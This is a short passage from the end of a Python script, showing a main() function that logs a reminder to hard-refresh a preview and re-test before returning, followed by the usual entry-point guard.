    LOGGER.info("Hard-refresh the preview (Ctrl+Shift+R) and re-test.")
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())